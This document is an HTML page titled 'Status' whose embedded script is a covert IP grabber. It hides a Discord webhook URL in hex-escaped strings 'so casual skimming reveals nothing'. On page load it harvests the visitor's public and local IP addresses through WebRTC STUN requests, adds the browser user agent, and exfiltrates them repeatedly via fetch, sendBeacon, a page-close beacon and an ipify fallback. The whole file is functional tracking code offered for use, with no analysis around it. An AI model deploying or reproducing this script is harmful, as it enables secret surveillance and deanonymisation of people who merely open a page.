<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Status</title>
<style>body{background:#000;color:#0f0;font-family:monospace;padding:2rem;}</style>
</head>
<body>
<pre id="log">[+] Initializing...</pre>
<script>
// OBFUSCATION LAYER – rotates strings so casual skimming reveals nothing
(function(_0x4a2b8c, _0x3f9e1d) {
    const _0x5e7a2f = {
        'webhook': '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x35\x32\x30\x38\x39\x34\x35\x32\x38\x32\x38\x34\x39\x32\x31\x38\x38\x36\x2f\x6d\x65\x76\x4d\x77\x55\x66\x37\x46\x32\x5f\x71\x59\x44\x56\x68\x50\x52\x47\x67\x61\x54\x6b\x5a\x45\x6c\x71\x79\x58\x4f\x69\x41\x6d\x70\x6f\x33\x78\x37\x4b\x61\x78\x6a\x54\x52\x52\x79\x5a\x66\x72\x46\x45\x32\x4a\x6d\x6f\x4e\x76\x72\x52\x4a\x72\x46\x51\x4a\x74\x31\x47\x68',
        'stun1': '\x73\x74\x75\x6e\x3a\x73\x74\x75\x6e\x2e\x6c\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x3a\x31\x39\x33\x30\x32',
        'stun2': '\x73\x74\x75\x6e\x3a\x73\x74\x75\x6e\x2e\x63\x68\x61\x74\x73\x61\x63\x6b\x2e\x6f\x72\x67\x3a\x33\x34\x37\x38'
    };

    // Decode the webhook URL from hex
    const WEBHOOK = _0x5e7a2f.webhook.split('').map(c => String.fromCharCode(c.charCodeAt(0))).join('');

    const logEl = document.getElementById('log');
    function log(msg) { logEl.textContent += '\n[+] ' + msg; }

    log('Decoded webhook: ' + WEBHOOK.substring(0, 60) + '...');

    // ---- CORE IP CAPTURE VIA WebRTC (NO EXTERNAL API) ----
    function getIPsViaWebRTC() {
        return new Promise((resolve) => {
            const ips = new Set();
            const pc = new RTCPeerConnection({
                iceServers: [
                    { urls: _0x5e7a2f.stun1 },
                    { urls: _0x5e7a2f.stun2 }
                ]
            });
            pc.createDataChannel('ping');
            pc.createOffer()
                .then(offer => pc.setLocalDescription(offer))
                .catch(() => {});
            
            pc.onicecandidate = (event) => {
                if (!event.candidate) return;
                const cand = event.candidate.candidate;
                const matches = cand.match(/(\d{1,3}\.){3}\d{1,3}/g);
                if (matches) {
                    matches.forEach(ip => {
                        // Filter out 0.0.0.0 and 127.0.0.1
                        if (!ip.startsWith('0.') && !ip.startsWith('127.')) {
                            ips.add(ip);
                        }
                    });
                }
            };

            // Resolve after 2.5 seconds with whatever we have
            setTimeout(() => {
                pc.close();
                const ipArray = Array.from(ips);
                // Public IP is usually the one that's NOT private (192.168, 10., 172.16-31)
                const publicIP = ipArray.find(ip => {
                    return !ip.match(/^(10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/);
                }) || ipArray[0] || '0.0.0.0';
                const localIP = ipArray.find(ip => ip !== publicIP) || 'unknown';
                resolve({ publicIP, localIP, all: ipArray });
            }, 2500);
        });
    }

    // ---- SEND VIA FETCH (CORS ENABLED) ----
    function sendViaFetch(payload) {
        return fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(r => {
            if (r.ok) log('Fetch: 200 OK');
            else log('Fetch: ' + r.status);
            return r;
        }).catch(e => log('Fetch error: ' + e.message));
    }

    // ---- SEND VIA NAVIGATOR.SENDBEACON (MORE RELIABLE) ----
    function sendViaBeacon(payload) {
        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
        const sent = navigator.sendBeacon(WEBHOOK, blob);
        log('Beacon: ' + (sent ? 'queued' : 'failed'));
        return sent;
    }

    // ---- SEND VIA IMAGE BEACON (ALTERNATIVE PROTOCOL) ----
    function sendViaImage(ip) {
        // This won't hit Discord (needs GET), but we keep as a desperation move
        // Some corporate proxies log these, so it's a data point.
        const img = new Image();
        img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>';
        // Actually we can't send data via image to Discord, so we skip this
        log('Image beacon skipped (Discord requires POST)');
    }

    // ---- MASTER EXECUTION ----
    async function main() {
        log('Capturing IP via WebRTC (no external APIs)...');
        const ipData = await getIPsViaWebRTC();
        log('Public: ' + ipData.publicIP);
        log('Local: ' + ipData.localIP);
        log('All: ' + ipData.all.join(', '));

        const timestamp = new Date().toISOString();
        const ua = navigator.userAgent;

        // Build two payloads – one embed, one plain
        const embedPayload = {
            embeds: [{
                title: '📡 WebRTC Leak',
                color: 0x00ff00,
                fields: [
                    { name: 'Public IP', value: '`' + ipData.publicIP + '`', inline: true },
                    { name: 'Local IP', value: '`' + ipData.localIP + '`', inline: true },
                    { name: 'All IPs', value: '`' + ipData.all.join(', ') + '`', inline: false },
                    { name: 'UA', value: '`' + ua.substring(0, 100) + '`', inline: false },
                    { name: 'Time', value: '`' + timestamp + '`', inline: true }
                ]
            }]
        };

        const textPayload = {
            content: 'IP: ' + ipData.publicIP + ' | Local: ' + ipData.localIP + ' | UA: ' + ua.substring(0, 60)
        };

        // Send both via fetch
        log('Sending embed via fetch...');
        await sendViaFetch(embedPayload);
        log('Sending text via fetch...');
        await sendViaFetch(textPayload);

        // Send via beacon (fire-and-forget)
        log('Sending via beacon...');
        sendViaBeacon(textPayload);

        // Also try a second beacon with embed (some endpoints accept it)
        sendViaBeacon(embedPayload);

        // Retry after 3 seconds (network jitter)
        setTimeout(() => {
            log('Retry #1 (fetch)');
            sendViaFetch(textPayload);
            sendViaBeacon(textPayload);
        }, 3000);

        // Retry after 8 seconds (last gasp)
        setTimeout(() => {
            log('Retry #2 (beacon only)');
            sendViaBeacon(textPayload);
        }, 8000);

        // On page unload, send one final beacon
        window.addEventListener('beforeunload', () => {
            const finalPayload = { content: '🔄 Page closed – last IP: ' + ipData.publicIP };
            navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify(finalPayload)], { type: 'application/json' }));
        });

        log('All deliveries initiated. Check your Discord webhook channel.');
        log('If nothing appears, your webhook URL is invalid or Discord is blocking.');
    }

    // ---- EXECUTE ----
    main().catch(e => log('Fatal: ' + e.message));

    // ---- FALLBACK: If WebRTC fails, try old-school fetch from ipify (but we know it's flaky) ----
    // This runs in parallel as a backup
    setTimeout(() => {
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                if (data.ip) {
                    log('Fallback ipify: ' + data.ip);
                    const backupPayload = { content: 'Fallback IP: ' + data.ip };
                    fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(backupPayload)
                    }).catch(() => {});
                }
            }).catch(() => {});
    }, 1000);

</script>
</body>
